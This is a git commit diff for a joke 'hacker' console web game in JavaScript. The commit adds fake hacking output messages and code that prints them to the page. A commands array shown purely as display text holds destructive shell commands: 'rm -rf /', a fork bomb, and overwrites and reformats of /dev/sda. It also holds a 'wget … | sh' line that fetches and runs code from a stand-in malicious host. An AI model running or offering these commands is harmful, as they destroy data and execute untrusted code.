b22e96d99fbecbf8616f10df42a23960f76de28c
Torinberger <torinberger@torinberger.com>
2018-06-12 10:53:28 +1000

    first form of basic console output

--- src/game.js
+++ src/game.js
@@ -1,5 +1,8 @@
 
 var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]
+var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[hack] Deploying sporkbomb\n[sporkbomb] I is a big sporkbomb, Loading...\n[Hack] sporkbombed!",
+
+              ]
 
 var out1;
 var out2;
@@ -15,6 +18,12 @@ function generateCommand() {
   var command = "<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[target]+"</p>";
   $("#console-text").append(command);
   $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);
+
+  var output = outputs[0].split("\n");
+  for (var i = 0; i < output.length; i++) {
+    $("#console-text").append("<p class='command'>"+output[i]+"</p>");
+    $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 10);
+  }
 }
 
 function populateOuts() {
